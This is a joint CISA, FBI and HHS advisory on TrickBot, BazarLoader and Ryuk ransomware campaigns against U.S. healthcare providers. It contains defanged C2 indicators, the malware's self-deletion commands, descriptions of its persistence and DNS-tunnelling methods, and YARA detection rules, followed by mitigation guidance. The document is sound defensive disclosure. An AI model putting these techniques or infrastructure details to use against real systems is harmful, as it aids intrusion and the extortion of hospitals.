This joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Health and Human Services (HHS). This advisory describes the tactics, techniques, and procedures (TTPs) used by cybercriminals against targets in the Healthcare and Public Health (HPH) Sector to infect systems with ransomware, notably Ryuk and Conti, for financial gain.
CISA, FBI, and HHS have credible information of an increased and imminent cybercrime threat to U.S. hospitals and healthcare providers. CISA, FBI, and HHS are sharing this information to provide warning to healthcare providers to ensure that they take timely and reasonable precautions to protect their networks from these threats.
Click here for a PDF version of this report.
Key Findings

CISA, FBI, and HHS assess malicious cyber actors are targeting the HPH Sector with TrickBot and BazarLoader malware, often leading to ransomware attacks, data theft, and the disruption of healthcare services.
These issues will be particularly challenging for organizations within the COVID-19 pandemic; therefore, administrators will need to balance this risk when determining their cybersecurity investments.


Technical Details

Threat Details
The cybercriminal enterprise behind TrickBot, which is likely also the creator of BazarLoader malware, has continued to develop new functionality and tools, increasing the ease, speed, and profitability of victimization. These threat actors increasingly use loaders—like TrickBot and BazarLoader (or BazarBackdoor)—as part of their malicious cyber campaigns. Cybercriminals disseminate TrickBot and BazarLoader via phishing campaigns that contain either links to malicious websites that host the malware or attachments with the malware. Loaders start the infection chain by distributing the payload; they deploy and execute the backdoor from the command and control (C2) server and install it on the victim’s machine.
TrickBot
What began as a banking trojan and descendant of Dyre malware, TrickBot now provides its operators a full suite of tools to conduct a myriad of illegal cyber activities. These activities include credential harvesting, mail exfiltration, cryptomining, point-of-sale data exfiltration, and the deployment of ransomware, such as Ryuk and Conti.
In early 2019, the FBI began to observe new TrickBot modules named Anchor, which cyber actors typically used in attacks targeting high-profile victims—such as large corporations. These attacks often involved data exfiltration from networks and point-of-sale devices. As part of the new Anchor toolset, TrickBot developers created anchor_dns, a tool for sending and receiving data from victim machines using Domain Name System (DNS) tunneling.
anchor_dns is a backdoor that allows victim machines to communicate with C2 servers over DNS to evade typical network defense products and make their malicious communications blend in with legitimate DNS traffic. anchor_dns uses a single-byte XOR cipher to encrypt its communications, which have been observed using key 0xB9. Once decrypted, the string anchor_dns can be found in the DNS request traffic.
TrickBot Indicators of Compromise
After successful execution of the malware, TrickBot copies itself as an executable file with a 12-character randomly generated file name (e.g. mfjdieks.exe) and places this file in one of the following directories.

C:\Windows\
C:\Windows\SysWOW64\
C:\Users\,Username,\AppData\Roaming\

Once the executable is running and successful in establishing communication with C2s, the executable places appropriate modules downloaded from C2s for the infected processor architecture type (32 or 64 bit instruction set), to the infected host’s %APPDATA% or %PROGRAMDATA% directory, such as %AppData\Roaming\winapp. Some commonly named plugins that are created in a Modules subdirectory are (the detected architecture is appended to the module filename, e.g., importDll32 or importDll64):

Systeminfo
importDll
outlookDll
injectDll with a directory (ex. injectDLL64_configs) containing configuration files:

dinj
sinj
dpost


mailsearcher with a directory (ex. mailsearcher64_configs) containing configuration file:

mailconf


networkDll with a directory (ex. networkDll64_configs) containing configuration file:

dpost


wormDll
tabDll
shareDll

Filename client_id or data or FAQ with the assigned bot ID of the compromised system is created in the malware directory. Filename group_tag or Readme.md containing the TrickBot campaign IDs is created in the malware directory.
The malware may also drop a file named anchorDiag.txt in one of the directories listed above.
Part of the initial network communications with the C2 server involves sending information about the victim machine such as its computer name/hostname, operating system version, and build via a base64-encoded GUID. The GUID is composed of /GroupID/ClientID/ with the following naming convention:
/anchor_dns/,COMPUTERNAME,_,WindowsVersionBuildNo,.,32CharacterString,/.
The malware uses scheduled tasks that run every 15 minutes to ensure persistence on the victim machine. The scheduled task typically uses the following naming convention.,random_folder_name_in_%APPDATA%_excluding_Microsoft,
autoupdate#,5_random_numbers, (e.g., Task autoupdate#16876).
After successful execution, anchor_dns further deploys malicious batch scripts (.bat) using PowerShell commands.
The malware deploys self-deletion techniques by executing the following commands.

cmd.exe /c timeout 3 && del C:\Users\,username,\,malware_sample,
cmd.exe /C PowerShell \""Start-Sleep 3; Remove-Item C:\Users\,username,\,malware_sample_location,\""

The following domains found in outbound DNS records are associated with anchor_dns.

kostunivo,.,com
chishir,.,com
mangoclone,.,com
onixcellent,.,com

This malware used the following legitimate domains to test internet connectivity.

ipecho,.,net
api,.,ipify,.,org
checkip,.,amazonaws,.,com
ip,.,anysrc,.,net
wtfismyip,.,com
ipinfo,.,io
icanhazip,.,com
myexternalip,.,com
ident,.,me

Currently, there is an open-source tracker for TrickBot C2 servers located at https://feodotracker.abuse.ch/browse/trickbot/.
The anchor_dns malware historically used the following C2 servers.

23,.,95,.,97,.,59
51,.,254,.,25,.,115
193,.,183,.,98,.,66
91,.,217,.,137,.,37
87,.,98,.,175,.,85

TrickBot YARA Rules
rule anchor_dns_strings_filenames {
    meta:
        description = ""Rule to detect AnchorDNS samples based off strings or filenames used in malware""
        author = ""NCSC""
        hash1 = ""fc0efd612ad528795472e99cae5944b68b8e26dc""
        hash2 = ""794eb3a9ce8b7e5092bb1b93341a54097f5b78a9""
        hash3 = ""9dfce70fded4f3bc2aa50ca772b0f9094b7b1fb2""
        hash4 = ""24d4bbc982a6a561f0426a683b9617de1a96a74a""
    strings:
        $ = "",Control_RunDLL \x00""
        $ = "":$GUID"" ascii wide
        $ = "":$DATA"" ascii wide
        $ = ""/1001/""
        $ = /(\x00|\xCC)qwertyuiopasdfghjklzxcvbnm(\x00|\xCC)/
        $ = /(\x00|\xCC)QWERTYUIOPASDFGHJKLZXCVBNM(\x00|\xCC)/
        $ = ""start program with cmdline \""%s\""""
        $ = ""Global\\fde345tyhoVGYHUJKIOuy""
        $ = ""ChardWorker::thExecute: error registry me""
        $ = ""get command: incode %s, cmdid \""%s\"", cmd \""%s\""""
        $ = ""anchorDNS""
        $ = ""Anchor_x86""
        $ = ""Anchor_x64""
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them
}
rule anchor_dns_icmp_transport {
    meta:
        description = ""Rule to detect AnchorDNS samples based off ICMP transport strings""
        author = ""NCSC""
        hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
    strings:
        $ = ""reset_connection <- %s""
        $ = ""server_ok <- %s (packets on server %s)""
        $ = ""erase successfully transmitted packet (count: %d)""
        $ = ""Packet sended with crc %s -> %s""
        $ = ""send data confimation to server(%s)""
        $ = ""data recived from <- %s""
        $ = ""Rearmost packed recived (id: %s)""
        $ = ""send poll to server -> : %s""
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them
}
rule anchor_dns_config_dexor {
    meta:
        description = ""Rule to detect AnchorDNS samples based off configuration deobfuscation (XOR 0x23 countup)""
        author = ""NCSC""
        hash1 = ""d0278ec015e10ada000915a1943ddbb3a0b6b3db""
        hash2 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
    strings:
        $x86 = {75 1F 56 6A 40 B2 23 33 C9 5E 8A 81 ?? ?? ?? ?? 32 C2 FE C2 88 81 ?? ?? ?? ?? 41 83 EE 01 75 EA 5E B8 ?? ?? ?? ?? C3}
        $x64 = {41 B0 23 41 B9 80 00 00 00 8A 84 3A ?? ?? ?? 00 41 32 C0 41 FE C0 88 04 32 48 FF C2 49 83 E9 01 75 E7}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
rule anchor_dns_installer {
    meta:
        description = ""Rule to detect AnchorDNS installer samples based off MZ magic under one-time pad or deobfuscation loop code""
        author = ""NCSC""
        hash1 = ""fa98074dc18ad7e2d357b5d168c00a91256d87d1""
        hash2 = ""78f0737d2b1e605aad62af252b246ef390521f02""
    strings:
        $pre = {43 00 4F 00 4E 00 4F 00 55 00 54 00 24 00 00 00} //CONOUT$
        $pst = {6B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 00} //kernel32.dll
        $deob_x86 = {8B C8 89 4D F8 83 F9 FF 74 52 46 89 5D F4 88 5D FF 85 F6 74 34 8A 83 ?? ?? ?? ?? 32 83 ?? ?? ?? ?? 6A 00 88 45 FF 8D 45 F4 50 6A 01 8D 45 FF 50 51 FF 15 34 80 41 00 8B 4D F8 43 8B F0 81 FB 00 ?? ?? ?? 72 CC 85 F6 75 08}
        $deob_x64 = {42 0F B6 84 3F ?? ?? ?? ?? 4C 8D 8C 24 80 00 00 00 42 32 84 3F ?? ?? ?? ?? 48 8D 54 24 78 41 B8 01 00 00 00 88 44 24 78 48 8B CE 48 89 6C 24 20 FF 15 ?? ?? ?? ?? 48 FF C7 8B D8 48 81 FF ?? ?? ?? ?? 72 B8}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)
        and
            (   uint16(@pre+16) ^ uint16(@pre+16+((@pst-(@pre+16))\2)) == 0x5A4D
                or
                $deob_x86 or $deob_x64
            )
}
import ""pe""
rule anchor_dns_string_1001_with_pe_section_dll_export_resolve_ip_domains {
    meta:
        description = ""Rule to detect AnchorDNS samples based off /1001/ string in combination with DLL export name string, PE section .addr or IP resolution domains""
        author = ""NCSC""
        hash1 = ""ff8237252d53200c132dd742edc77a6c67565eee""
        hash2 = ""c8299aadf886da55cb47e5cbafe8c5a482b47fc8""
    strings:
        $str1001 = {2F 31 30 30 31 2F 00} // /1001/
        $strCtrl = {2C 43 6F 6E 74 72 6F 6C 5F 52 75 6E 44 4C 4C 20 00} //,Control_RunDLL
        $ip1 = ""checkip.amazonaws.com"" ascii wide
        $ip2 = ""ipecho.net"" ascii wide
        $ip3 = ""ipinfo.io"" ascii wide
        $ip4 = ""api.ipify.org"" ascii wide
        $ip5 = ""icanhazip.com"" ascii wide
        $ip6 = ""myexternalip.com"" ascii wide
        $ip7 = ""wtfismyip.com"" ascii wide
        $ip8 = ""ip.anysrc.net"" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)
        and $str1001
        and (
                for any i in (0..pe.number_of_sections): (
                   pe.sections,i,.name == "".addr""
                )
            or
                $strCtrl
            or
                6 of ($ip*)
            )
}
rule anchor_dns_check_random_string_in_dns_response {
    meta:
        description = ""Rule to detect AnchorDNS samples based off checking random string in DNS response""
        author = ""NCSC""
        hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
        hash2 = ""14e9d68bba7a184863667c680a8d5a757149aa36""
    strings:
        $x86 = {8A D8 83 C4 10 84 DB 75 08 8B 7D BC E9 84 00 00 00 8B 7D BC 32 DB 8B C7 33 F6 0F 1F 00 85 C0 74 71 40 6A 2F 50 E8 ?? ?? ?? ?? 46 83 C4 08 83 FE 03 72 EA 85 C0 74 5B 83 7D D4 10 8D 4D C0 8B 75 D0 8D 50 01 0F 43 4D C0 83 EE 04 72 11 8B 02 3B 01 75 10 83 C2 04 83 C1 04 83 EE 04 73 EF 83 FE FC 74 2D 8A 02 3A 01 75 29 83 FE FD 74 22 8A 42 01 3A 41 01 75 1C 83 FE FE 74 15 8A 42 02 3A 41 02 75 0F 83 FE FF 74 08 8A 42 03 3A 41 03 75 02 B3 01 8B 75 B8}
        $x64 = {4C 39 75 EF 74 56 48 8D 45 DF 48 83 7D F7 10 48 0F 43 45 DF 49 8B FE 48 85 C0 74 40 48 8D 48 01 BA 2F 00 00 00 E8 ?? ?? ?? ?? 49 03 FF 48 83 FF 03 72 E4 48 85 C0 74 24 48 8D 55 1F 48 83 7D 37 10 48 0F 43 55 1F 48 8D 48 01 4C 8B 45 2F E8 ?? ?? ?? ?? 0F B6 DB 85 C0 41 0F 44 DF 49 03 F7 48 8B 55 F7 48 83 FE 05 0F 82 6A FF FF FF}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
rule anchor_dns_default_result_execute_command {
    meta:
        description = ""Rule to detect AnchorDNS samples based off default result value and executing command""
        author = ""NCSC""
        hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""
        hash2 = ""14e9d68bba7a184863667c680a8d5a757149aa36""
    strings:
        $x86 = {83 C4 04 3D 80 00 00 00 73 15 8B 04 85 ?? ?? ?? ?? 85 C0 74 0A 8D 4D D8 51 8B CF FF D0 8A D8 84 DB C7 45 A4 0F 00 00 00}
        $x64 = {48 98 B9 E7 03 00 00 48 3D 80 00 00 00 73 1B 48 8D 15 ?? ?? ?? ?? 48 8B 04 C2 48 85 C0 74 0B 48 8D 55 90 48 8B CE FF D0 8B C8}
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
rule anchor_dns_pdbs {
    meta:
        description = ""Rule to detect AnchorDNS samples based off partial PDB paths""
        author = ""NCSC""
        hash1 = ""f0e575475f33600aede6a1b9a5c14f671cb93b7b""
        hash2 = ""1304372bd4cdd877778621aea715f45face93d68""
        hash3 = ""e5dc7c8bfa285b61dda1618f0ade9c256be75d1a""
        hash4 = ""f96613ac6687f5dbbed13c727fa5d427e94d6128""
        hash5 = ""46750d34a3a11dd16727dc622d127717beda4fa2""
    strings:
        $ = "":\\MyProjects\\secondWork\\Anchor\\""        
        $ = "":\\simsim\\anchorDNS""
        $ = "":\\,JOB,\\Anchor\\""
        $ = "":\\Anchor\\Win32\\Release\\Anchor_""
        $ = "":\\Users\\ProFi\\Desktop\\data\\Win32\\anchor""
    condition:
        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them
}
BazarLoader/BazarBackdoor
Beginning in approximately early 2020, actors believed to be associated with TrickBot began using BazarLoader and BazarBackdoor to infect victim networks. The loader and backdoor work closely together to achieve infection and communicate with the same C2 infrastructure. Campaigns using Bazar represent a new technique for cybercriminals to infect and monetize networks and have increasingly led to the deployment of ransomware, including Ryuk. BazarLoader has become one of the most commonly used vectors for ransomware deployment.
Deployment of the BazarLoader malware typically comes from phishing email and contains the following:

Phishing emails are typically delivered by commercial mass email delivery services. Email received by a victim will contain a link to an actor-controlled Google Drive document or other free online filehosting solutions, typically purporting to be a PDF file.
This document usually references a failure to create a preview of the document and contains a link to a URL hosting a malware payload in the form of a misnamed or multiple extension file.
Emails can appear as routine, legitimate business correspondence about customer complaints, hiring decision, or other important tasks that require the attention of the recipient.  
Some email communications have included the recipient’s name or employer name in the subject line and/or email body.

Through phishing emails linking users to Google Documents, actors used the below identified file names to install BazarLoader:

Report-Review26-10.exe
Review_Report15-10.exe
Document_Print.exe
Report10-13.exe
Text_Report.exe

Bazar activity can be identified by searching the system startup folders and Userinit values under the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon registry key:
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\adobe.lnk
For a comprehensive list of indicators of compromise regarding the BazarLocker and other malware, see https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html.
Indicators
In addition to TrickBot and BazarLoader, threat actors are using malware, such as KEGTAP, BEERBOT, SINGLEMALT, and others as they continue to change tactics, techniques, and procedures in their highly dynamic campaign. The following C2 servers are known to be associated with this malicious activity.

45,.,148,.,10,.,92
170,.,238,.,117,.,187
177,.,74,.,232,.,124
185,.,68,.,93,.,17
203,.,176,.,135,.,102
96,.,9,.,73,.,73
96,.,9,.,77,.,142
37,.,187,.,3,.,176
45,.,89,.,127,.,92
62,.,108,.,35,.,103
91,.,200,.,103,.,242
103,.,84,.,238,.,3
36,.,89,.,106,.,69
103,.,76,.,169,.,213
36,.,91,.,87,.,227
105,.,163,.,17,.,83
185,.,117,.,73,.,163
5,.,2,.,78,.,118
185,.,90,.,61,.,69
185,.,90,.,61,.,62
86,.,104,.,194,.,30
31,.,131,.,21,.,184
46,.,28,.,64,.,8
104,.,161,.,32,.,111
107,.,172,.,140,.,171
131,.,153,.,22,.,148
195,.,123,.,240,.,219
195,.,123,.,242,.,119
195,.,123,.,242,.,120
51,.,81,.,113,.,25
74,.,222,.,14,.,27

Ryuk Ransomware
Typically Ryuk has been deployed as a payload from banking Trojans such as TrickBot. (See the United Kingdom (UK) National Cyber Security Centre (NCSC) advisory, Ryuk Ransomware Targeting Organisations Globally, on their ongoing investigation into global Ryuk ransomware campaigns and associated Emotet and TrickBot malware.) Ryuk first appeared in August 2018 as a derivative of Hermes 2.1 ransomware, which first emerged in late 2017 and was available for sale on the open market as of August 2018. Ryuk still retains some aspects of the Hermes code. For example, all of the files encrypted by Ryuk contain the HERMES tag but, in some infections, the files have .ryk added to the filename, while others do not. In other parts of the ransomware code, Ryuk has removed or replaced features of Hermes, such as the restriction against targeting specific Eurasia-based systems.
While negotiating the victim network, Ryuk actors will commonly use commercial off-the-shelf products—such as Cobalt Strike and PowerShell Empire—in order to steal credentials. Both frameworks are very robust and are highly effective dual-purpose tools, allowing actors to dump clear text passwords or hash values from memory with the use of Mimikatz. This allows the actors to inject malicious dynamic-link library into memory with read, write, and execute permissions. In order to maintain persistence in the victim environment, Ryuk actors have been known to use scheduled tasks and service creation.
Ryuk actors will quickly map the network in order to enumerate the environment to understand the scope of the infection. In order to limit suspicious activity and possible detection, the actors choose to live off the land and, if possible, use native tools—such as net view, net computers, and ping—to locate mapped network shares, domain controllers, and active directory. In order to move laterally throughout the network, the group relies on native tools, such as PowerShell, Windows Management Instrumentation (WMI), Windows Remote Management, and Remote Desktop Protocol (RDP). The group also uses third-party tools, such as Bloodhound.
Once dropped, Ryuk uses AES-256 to encrypt files and an RSA public key to encrypt the AES key. The Ryuk dropper drops a .bat file that attempts to delete all backup files and Volume Shadow Copies (automatic backup snapshots made by Windows), preventing the victim from recovering encrypted files without the decryption program.
In addition, the attackers will attempt to shut down or uninstall security applications on the victim systems that might prevent the ransomware from executing. Normally this is done via a script, but if that fails, the attackers are capable of manually removing the applications that could stop the attack. The RyukReadMe file placed on the system after encryption provides either one or two email  addresses, using the end-to-end encrypted email provider Protonmail, through which the victim can contact the attacker(s). While earlier versions provide a ransom amount in the initial notifications, Ryuk users are now designating a ransom amount only after the victim makes contact.
The victim is told how much to pay to a specified Bitcoin wallet for the decryptor and is provided a sample decryption of two files.
Initial testing indicates that the RyukReadMe file does not need to be present for the decryption script to run successfully but other reporting advises some files will not decrypt properly without it. Even if run correctly, there is no guarantee the decryptor will be effective. This is further complicated because the RyukReadMe file is deleted when the script is finished. This may affect the decryption script unless it is saved and stored in a different location before running.
According to MITRE, Ryuk uses the ATT&CK techniques listed in table 1.
Table 1: Ryuk ATT&CK techniques


Mitigations

For a downloadable copy of IOCs, see AA20-302A.stix. For additional IOCs detailing this activity, see https://gist.github.com/aaronst/6aa7f61246f53a8dd4befea86e832456.
Plans and Policies
CISA, FBI, and HHS encourage HPH Sector organizations to maintain business continuity plans—the practice of executing essential functions through emergencies (e.g., cyberattacks)—to minimize service interruptions. Without planning, provision, and implementation of continuity principles, organizations may be unable to continue operations. Evaluating continuity and capability will help identify continuity gaps. Through identifying and addressing these gaps, organizations can establish a viable continuity program that will help keep them functioning during cyberattacks or other emergencies. CISA, FBI, and HHS suggest HPH Sector organizations review or establish patching plans, security policies, user agreements, and business continuity plans to ensure they address current threats posed by malicious cyber actors.
Network Best Practices

Patch operating systems, software, and firmware as soon as manufacturers release updates.
Check configurations for every operating system version for HPH organization-owned assets to prevent issues from arising that local users are unable to fix due to having local administration disabled.
Regularly change passwords to network systems and accounts and avoid reusing passwords for different accounts.
Use multi-factor authentication where possible.
Disable unused remote access/Remote Desktop Protocol (RDP) ports and monitor remote access/RDP logs.
Implement application and remote access allow listing to only allow systems to execute programs known and permitted by the established security policy.
Audit user accounts with administrative privileges and configure access controls with least privilege in mind.
Audit logs to ensure new accounts are legitimate.
Scan for open or listening ports and mediate those that are not needed.
Identify critical assets such as patient database servers, medical records, and teleheatlh and telework infrastructure; create backups of these systems and house the backups offline from the network.
Implement network segmentation. Sensitive data should not reside on the same server and network segment as the email environment.
Set antivirus and anti-malware solutions to automatically update; conduct regular scans.

Ransomware Best Practices
CISA, FBI and HHS do not recommend paying ransoms. Payment does not guarantee files will be recovered. It may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. In addition to implementing the above network best practices, the FBI, CISA and HHS also recommend the following:

Regularly back up data, air gap, and password protect backup copies offline.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, secure location.

User Awareness Best Practices

Focus on awareness and training. Because end users are targeted, make employees and stakeholders aware of the threats—such as ransomware and phishing scams—and how they are delivered. Additionally, provide users training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities.
Ensure that employees know who to contact when they see suspicious activity or when they believe they have been a victim of a cyberattack. This will ensure that the proper established mitigation strategy can be employed quickly and efficiently.

Recommended Mitigation Measures
System administrators who have indicators of a TrickBot network compromise should immediately take steps to back up and secure sensitive or proprietary data. TrickBot infections may be indicators of an imminent ransomware attack; system administrators should take steps to secure network devices accordingly. Upon evidence of a TrickBot infection, review DNS logs and use the XOR key of 0xB9 to decode XOR encoded DNS requests to reveal the presence of Anchor_DNS, and maintain and provide relevant logs.
GENERAL RANSOMWARE MITIGATIONS — HPH SECTOR
This section is based on CISA and Multi-State Information Sharing and Analysis Center (MS-ISAC)'s Joint Ransomware Guide, which can be found at https://www.cisa.gov/publication/ransomware-guide.
CISA, FBI, and HHS recommend that healthcare organizations implement both ransomware prevention and ransomware response measures immediately.
Ransomware Prevention
Join and Engage with Cybersecurity Organizations
CISA, FBI, and HHS recommend that healthcare organizations take the following initial steps:

Join a healthcare information sharing organization, H-ISAC:

Health Information Sharing and Analysis Center (H-ISAC): https://h-isac.org/membership-account/join-h-isac/
Sector-based ISACs - National Council of ISACs: https://www.nationalisacs.org/member-isacs
Information Sharing and Analysis Organization (ISAO) Standards Organization: https://www.isao.org/information-sharing-groups/


Engage with CISA and FBI, as well as HHS—through the HHS Health Sector Cybersecurity Coordination Center (HC3)—to build a lasting partnership and collaborate on information sharing, best practices, assessments, and exercises.

CISA: cisa.gov, https://us-cert.cisa.gov/mailing-lists-and-feeds, central@cisa.gov  
FBI: ic3.gov, www.fbi.gov/contact-us/field, CyWatch@fbi.gov
HHS/HC3: http://www.hhs.gov/hc3, HC3@HHS.gov



Engaging with the H-ISAC, ISAO, CISA, FBI, and HHS/HC3 will enable your organization to receive critical information and access to services to better manage the risk posed by ransomware and other cyber threats.
Follow Ransomware Best Practices
Refer to the best practices and references below to help manage the risk posed by ransomware and support your organization’s coordinated and efficient response to a ransomware incident. Apply these practices to the greatest extent possible based on availability of organizational resources.

It is critical to maintain offline, encrypted backups of data and to regularly test your backups. Backup procedures should be conducted on a regular basis. It is important that backups be maintained offline or in separated networks as many ransomware variants attempt to find and delete any accessible backups. Maintaining offline, current backups is most critical because there is no need to pay a ransom for data that is readily accessible to your organization.

Use the 3-2-1 rule as a guideline for backup practices. The rule states that three copies of all critical data are retained on at least two different types of media and at least one of them is stored offline.
Maintain regularly updated “gold images” of critical systems in the event they need to be rebuilt. This entails maintaining image “templates” that include a preconfigured operating system (OS) and associated software applications that can be quickly deployed to rebuild a system, such as a virtual machine or server.
Retain backup hardware to rebuild systems in the event rebuilding the primary system is not preferred.

Hardware that is newer or older than the primary system can present installation or compatibility hurdles when rebuilding from images.
Ensure all backup hardware is properly patched.




In addition to system images, applicable source code or executables should be available (stored with backups, escrowed, license agreement to obtain, etc.). It is more efficient to rebuild from system images, but some images will not install on different hardware or platforms correctly; having separate access to needed software will help in these cases.
Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response and notification procedures for a ransomware incident.

Review available incident response guidance, such as CISA’s Technical Approaches to Uncovering and Remediating Malicious Activity https://us-cert.cisa.gov/ncas/alerts/aa20-245a.


Help your organization better organize around cyber incident response.
Develop a cyber incident response plan.
The Ransomware Response Checklist, available in the CISA and MS-ISAC Joint Ransomware Guide, serves as an adaptable, ransomware- specific annex to organizational cyber incident response or disruption plans.
Review and implement as applicable MITRE’s Medical Device Cybersecurity: Regional Incident Preparedness and Response Playbook (https://www.mitre.org/sites/default/files/publications/pr-18-1550-Medical-Device-Cybersecurity-Playbook.pdf).
Develop a risk management plan that maps critical health services and care to the necessary information systems; this will ensure that the incident response plan will contain the proper triage procedures.
Plan for the possibility of critical information systems being inaccessible for an extended period of time. This should include but not be limited to the following:

Print and properly store/protect hard copies of digital information that would be required for critical patient healthcare.
Plan for and periodically train staff to handle the re-routing of incoming/existing patients in an expedient manner if information systems were to abruptly and unexpectedly become unavailable.
Coordinate the potential for surge support with other healthcare facilities in the greater local area. This should include organizational leadership periodically meeting and collaborating with counterparts in the greater local area to create/update plans for their facilities to both abruptly send and receive a significant amount of critical patients for immediate care. This may include the opportunity to re-route healthcare employees (and possibly some equipment) to provide care along with additional patients.


Consider the development of a second, air-gapped communications network that can provide a minimum standard of backup support for hospital operations if the primary network becomes unavailable if/when needed.
Predefine network segments, IT capabilities and other functionality that can either be quickly separated from the greater network or shut down entirely without impacting operations of the rest of the IT infrastructure.
Legacy devices should be identified and inventoried with highest priority and given special consideration during a ransomware event.
See CISA and MS-ISAC's Joint Ransomware Guide for infection vectors including internet-facing vulnerabilities and misconfigurations; phishing; precursor malware infection; and third parties and managed service providers.
HHS/HC3 tracks ransomware that is targeting the HPH Sector; this information can be found at http://www.hhs.gov/hc3.

Hardening Guidance

The Food and Drug Administration provides multiple guidance documents regarding the hardening of healthcare and specifically medical devices found here: https://www.fda.gov/medical-devices/digital-health-center-excellence/cybersecurity.
See CISA and MS-ISAC's Joint Ransomware Guide for additional in-depth hardening guidance.

Contact CISA for These No-Cost Resources

Information sharing with CISA and MS-ISAC (for SLTT organizations) includes bi-directional sharing of best practices and network defense information regarding ransomware trends and variants as well as malware that is a precursor to ransomware.
Policy-oriented or technical assessments help organizations understand how they can improve their defenses to avoid ransomware infection: https://www.cisa.gov/cyber-resource-hub.

Assessments include Vulnerability Scanning and Phishing Campaign Assessment.


Cyber exercises evaluate or help develop a cyber incident response plan in the context of a ransomware incident scenario.
CISA Cybersecurity Advisors (CSAs) advise on best practices and connect you with CISA resources to manage cyber risk.
Contacts:

SLTT organizations: CyberLiaison_SLTT@cisa.dhs.gov
Private sector organizations: CyberLiaison_Industry@cisa.dhs.gov



Ransomware Quick References

Ransomware: What It Is and What to Do About It (CISA): General ransomware guidance for organizational leadership and more in-depth information for CISOs and technical staff: https://www.us-cert.cisa.gov/sites/default/files/publications/Ransomware_Executive_One-Pager_and_Technical_ Document-FINAL.pdf
Ransomware (CISA): Introduction to ransomware, notable links to CISA products on protecting networks, specific ransomware threats, and other resources: https://www.us-cert.cisa.gov/Ransomware  
HHS/HC3: Ransomware that impacts HPH is tracked by the HC3 and can be found at www.hhs.gov/hc3
Security Primer – Ransomware (MS-ISAC): Outlines opportunistic and strategic ransomware campaigns, common infection vectors, and best practice recommendations: https://www.cisecurity.org/white-papers/security-primer-ransomware/
Ransomware: Facts, Threats, and Countermeasures (MS- ISAC): Facts about ransomware, infection vectors, ransomware capabilities, and how to mitigate the risk of ransomware infection: https://www.cisecurity.org/blog/ransomware- facts-threats-and-countermeasures/
HHS Ransomware Fact Sheet: https://www.hhs.gov/sites/default/files/RansomwareFactSheet.pdf
NIST Securing Data Integrity White Paper: https://csrc.nist.gov/publications/detail/white-paper/2020/10/01/securing-data-integrity-against-ransomware-attacks/draft

Ransomware Response Checklist
Remember: Paying the ransom will not ensure your data is decrypted or that your systems or data will no longer be compromised. CISA, FBI, and HHS do not recommend paying ransom.
Should your organization be a victim of ransomware, CISA strongly recommends responding by using the Ransomware Response Checklist located in CISA and MS-ISAC's Joint Ransomware Guide, which contains steps for detection and analysis as well as containment and eradication.
Consider the Need For Extended Identification or Analysis
If extended identification or analysis is needed, CISA, HHS/HC3, or federal law enforcement may be interested in any of the following information that your organization determines it can legally share:

Recovered executable file
Copies of the readme file – DO NOT REMOVE the file or decryption may not be possible
Live memory (RAM) capture from systems with additional signs of compromise (use of exploit toolkits, RDP activity, additional files found locally)
Images of infected systems with additional signs of compromise (use of exploit toolkits, RDP activity, additional files found locally)
Malware samples
Names of any other malware identified on your system
Encrypted file samples
Log files (Windows Event Logs from compromised systems, Firewall logs, etc.)
Any PowerShell scripts found having executed on the systems
Any user accounts created in Active Directory or machines added to the network during the exploitation
Email addresses used by the attackers and any associated phishing emails
A copy of the ransom note
Ransom amount and whether or not the ransom was paid
Bitcoin wallets used by the attackers
Bitcoin wallets used to pay the ransom (if applicable)
Copies of any communications with attackers

Upon voluntary request, CISA can assist with analysis (e.g., phishing emails, storage media, logs, malware) at no cost to support your organization in understanding the root cause of an incident, even in the event additional remote assistance is not requested.

CISA – Advanced Malware Analysis Center: https://www.malware.us-cert.gov/MalwareSubmission/pages/submission.jsf
Remote Assistance – Request via Central@cisa.gov


Contact Information

CISA, FBI, and HHS recommend identifying and having on hand the following contact information for ready use should your organization become a victim of a ransomware incident. Consider contacting these organizations for mitigation and response assistance or for purpose of notification.

State and Local Response Contacts
IT/IT Security Team – Centralized Cyber Incident Reporting
State and Local Law Enforcement
Fusion Center        
Managed/Security Service Providers
Cyber Insurance       

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov.
Additionally, see CISA and MS-ISAC's Joint Ransomware Guide for information on contacting—and what to expect from contacting—federal asset response and federal threat response contacts.
Disclaimer
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see https://cisa.gov/tlp.

References

